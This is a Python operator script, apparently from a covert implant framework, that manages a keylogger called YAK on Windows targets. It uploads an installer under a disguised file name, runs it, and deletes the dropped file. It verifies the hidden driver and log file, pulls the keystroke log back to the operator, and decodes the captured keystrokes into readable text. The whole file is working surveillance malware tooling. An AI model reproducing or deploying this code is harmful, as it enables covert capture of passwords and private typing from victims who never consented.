
import dsz.lp
import dsz.version
import dsz.ui
import dsz.path
import dsz.file
import dsz.control
import codecs
import os
import dsz.menu
YakUploadFile = 'yak_min_install.exe'
localInstallPath = ('yak2\\%s' % YakUploadFile)
localParsePath = ('%s\\Ops\\Tools\\i386-winnt\\yak2\\yak.exe' % dsz.lp.GetResourcesDirectory())
fileName = 'help16.exe'
tool = 'Yak'
version = '2'
keymap = {u'[end]': '1', u'\u2193': '2', u'[pg dn]': '3', u'\u2190': '4', u'[clear]': '5', u'\u2192': '6', u'[home]': '7', u'\u2191': '8', u'[pg up]': '9', u'[insert]': '0', u'[del]': '.'}

def yakshaver(input_file):
    input_handle = codecs.open(input_file, encoding='utf-16')
    data = input_handle.read()
    input_handle.close()
    for key in keymap.keys():
        data = data.replace(key, keymap[key])
    new_file = ('%s.shaved.txt' % os.path.splitext(input_file)[0])
    output_handle = file(new_file, 'wb')
    output_handle.write(data)
    output_handle.close()

def yakcollect(localParsePath):
    success = True
    dsz.ui.Echo(('Getting %s\\vbnarm.dll...' % systemPath))
    cmd = ('copyget "%s\\vbnarm.dll"' % systemPath)
    runsuccess = dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    if runsuccess:
        pass
    else:
        dsz.ui.Echo(('Could not copyget %s\\vbnarm.dll' % systemPath), dsz.ERROR)
        return False
    localName = dsz.cmd.data.Get('FileStart::LocalName', dsz.TYPE_STRING)[0]
    dsz.ui.Echo('Moving file to NOSEND directory...')
    dsz.control.echo.Off()
    dsz.cmd.Run(('local mkdir %s\\GetFiles\\NOSEND' % logdir))
    dsz.cmd.Run(('local mkdir %s\\GetFiles\\Yak_Decrypted' % logdir))
    cmd = ('local move %s\\GetFiles\\%s %s\\GetFiles\\NOSEND\\%s' % (logdir, localName, logdir, localName))
    runsuccess = dsz.cmd.Run(cmd)
    dsz.control.echo.On()
    if runsuccess:
        pass
    else:
        dsz.ui.Echo(('Could not move GetFiles\\%s into GetFiles\\NOSEND\\%s' % (localName, localName)), dsz.ERROR)
        return False
    parsefile(('%s\\GetFiles\\NOSEND\\%s' % (logdir, localName)))
    cmd = ('local dir -mask *%s* -path "%s\\GetFiles\\NOSEND"' % (fileDate, logdir))
    dsz.cmd.Run(cmd)
    return success

def parsefile(fullpath):
    dsz.ui.Echo('Parsing file...')
    global fileDate
    fileDate = fullpath.split('GetFile')[(-1)]
    parsethis(fullpath, '-tu -l -enus')
    parsethis(fullpath, '-tau -l -enus')
    try:
        yakshaver(('%s\\GetFiles\\Yak_Decrypted\\keylogger_scancodes_UNICODE_EN%s.txt' % (logdir, fileDate)))
    except:
        dsz.ui.Echo('Could not run yakshaver')
    parsethis(fullpath, '-tu')
    parsethis(fullpath, '-tau')
    parsethis(fullpath, '-t')
    parsethis(fullpath, '-ta')
    parsethis(fullpath, '-dp')

def parsethis(FILE, ARGS):
    dsz.ui.Echo(('Parsing with %s' % ARGS))
    TYPE = ''
    LANG = ''
    if (ARGS == '-tu'):
        TYPE = 'UNICODE'
    elif (ARGS == '-tau'):
        TYPE = 'scancodes_UNICODE'
    elif (ARGS == '-t'):
        TYPE = 'ASCII'
    elif (ARGS == '-ta'):
        TYPE = 'scancodes_ASCII'
    elif (ARGS == '-dp'):
        TYPE = 'DUMP'
    elif (ARGS == '-tu -l -enus'):
        ARGS = '-tu'
        TYPE = 'UNICODE_EN'
        LANG = '-l -enus'
    elif (ARGS == '-tau -l -enus'):
        ARGS = '-tau'
        TYPE = 'scancodes_UNICODE_EN'
        LANG = '-l -enus'
    cmd = ('local run -command "%s %s -i %s -o %s\\GetFiles\\Yak_Decrypted\\keylogger_%s%s.txt %s" -wait' % (localParsePath, ARGS, FILE, logdir, TYPE, fileDate, LANG))
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(cmd)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo(('Could not run %s %s %s' % (localParsePath, ARGS, LANG)))
        return False

def yakverify():
    logSuccessFlag = True
    driverSuccessFlag = True
    success = True
    if dsz.file.Exists('vbnarm.dll', systemPath):
        dsz.ui.Echo('vbnarm.dll log file exists ... SUCCESSFUL', dsz.GOOD)
    else:
        dsz.ui.Echo('vbnarm.dll log file missing ... FAILED', dsz.ERROR)
        logSuccessFlag = False
    if dsz.file.Exists('fsprtx.sys', ('%s\\drivers' % systemPath)):
        dsz.ui.Echo('fsprtx.sys driver exists ... SUCCESSFUL', dsz.GOOD)
    else:
        dsz.ui.Echo('fsprtx.sys driver missing ... FAILED', dsz.ERROR)
        driverSuccessFlag = False
    if ((driverSuccessFlag == True) and (logSuccessFlag == True)):
        dsz.ui.Echo('YAK properlly installed on target', dsz.GOOD)
    elif (((driverSuccessFlag == False) and (logSuccessFlag == True)) or ((driverSuccessFlag == True) and (logSuccessFlag == False))):
        dsz.ui.Echo("YAK is in a bad state...need a reboot before it's functional", dsz.WARNING)
        success = False
    else:
        dsz.ui.Echo("YAK doesn't exist on target!", dsz.ERROR)
        success = False
    return success

def yakinstall(command):
    success = True
    dsz.ui.Echo(('Uploading %s to %s\\%s' % (YakUploadFile, systemPath, fileName)))
    cmd = ('put %s -project Ops -name "%s\\%s"' % (localInstallPath, systemPath, fileName))
    putsuccess = dsz.cmd.Run(cmd)
    if putsuccess:
        dsz.ui.Echo(('Running %s on target...' % fileName))
        cmd = ('run -command "%s\\%s %s"' % (systemPath, fileName, command))
        runsuccess = dsz.cmd.Run(cmd)
        if runsuccess:
            dsz.ui.Echo(('[run -command "%s\\%s %s"] ran "successfully"' % (systemPath, fileName, command)))
        else:
            dsz.ui.Echo(('[run -command "%s\\%s %s"] "failed"' % (systemPath, fileName, command)), dsz.ERROR)
    else:
        dsz.ui.Echo(('Could not put %s into %s\\%s' % (YakUploadFile, systemPath, fileName)), dsz.ERROR)
        success = False
    dsz.ui.Echo(('Deleting %s\\%s' % (systemPath, fileName)))
    cmd = ('delete -file %s\\%s' % (systemPath, fileName))
    deletesuccess = dsz.cmd.Run(cmd)
    if (not deletesuccess):
        dsz.ui.Echo(('Could not delete %s\\%s' % (systemPath, fileName)), dsz.ERROR)
        success = False
    return success

def yakexit():
    dsz.ui.Echo('***************************')
    dsz.ui.Echo('*  YAK script completed.  *')
    dsz.ui.Echo('***************************')
    return True

def install(garbage):
    return yakinstall('-is')

def uninstall(garbage):
    return yakinstall('-u')

def verify(garbage):
    return yakverify()

def collect(garbage):
    return yakcollect(localParsePath)

def parse(input):
    fullpath = dsz.ui.GetString('Please enter the full path to the file you want to parse: ', '')
    if (fullpath == ''):
        dsz.ui.Echo('No string entered', dsz.ERROR)
        return False
    success = parsefile(fullpath)
    if (not success):
        return False
    return True

def changename(garbage):
    global fileName
    fileName = dsz.ui.GetString('New upload name for YAK2:', 'help16.exe')
    dsz.ui.Echo(('*** Upload name now set to %s ***' % fileName), dsz.WARNING)
    return True

def main():
    menuOption = 0
    if (not dsz.version.checks.IsWindows()):
        dsz.ui.Echo('YAK requires a Windows OS', dsz.ERROR)
        return 0
    if dsz.path.windows.GetSystemPath():
        global systemPath
        systemPath = dsz.path.windows.GetSystemPath()
    else:
        dsz.ui.Echo('Could not find system path', dsz.ERROR)
        return 0
    global logdir
    logdir = dsz.lp.GetLogsDirectory()
    menu_list = list()
    menu_list.append({dsz.menu.Name: 'Install', dsz.menu.Function: install})
    menu_list.append({dsz.menu.Name: 'Uninstall', dsz.menu.Function: uninstall})
    menu_list.append({dsz.menu.Name: 'Verify Install', dsz.menu.Function: verify})
    menu_list.append({dsz.menu.Name: 'Collect and Parse', dsz.menu.Function: collect})
    menu_list.append({dsz.menu.Name: 'Parse Local', dsz.menu.Function: parse})
    menu_list.append({dsz.menu.Name: 'Change Upload Name', dsz.menu.Function: changename})
    while (menuOption != (-1)):
        (retvalue, menuOption) = dsz.menu.ExecuteSimpleMenu(('\n\n========================\nYAK%s Menu\n========================\nCurrent upload name for %s: %s\n' % (version, YakUploadFile, fileName)), menu_list)
        if (menuOption == 0):
            if retvalue:
                dsz.ui.Echo('== YAK Install Successful ==', dsz.GOOD)
                dsz.lp.RecordToolUse(tool, version, 'DEPLOYED', 'Successful')
            else:
                dsz.ui.Echo('== YAK Install FAILED ==', dsz.ERROR)
                dsz.lp.RecordToolUse(tool, version, 'DEPLOYED', 'Unsuccessful')
        elif (menuOption == 1):
            if retvalue:
                dsz.ui.Echo('== YAK Uninstall Successful ==', dsz.GOOD)
                dsz.lp.RecordToolUse(tool, version, 'DELETED', 'Successful')
            else:
                dsz.ui.Echo('== YAK Uninstall Unsuccessful ==', dsz.GOOD)
                dsz.lp.RecordToolUse(tool, version, 'DELETED', 'Unsuccessful')
        elif (menuOption == 2):
            if retvalue:
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Successful')
            else:
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Unsuccessful')
        elif (menuOption == 3):
            if retvalue:
                dsz.ui.Echo('== YAK Collection Successful ==', dsz.GOOD)
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Successful')
            else:
                dsz.ui.Echo('== Collection and parsing could not be completed, please finish manually ==', dsz.ERROR)
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Unsuccessful')
        elif (menuOption == 4):
            if retvalue:
                pass
            else:
                pass
if (__name__ == '__main__'):
    main()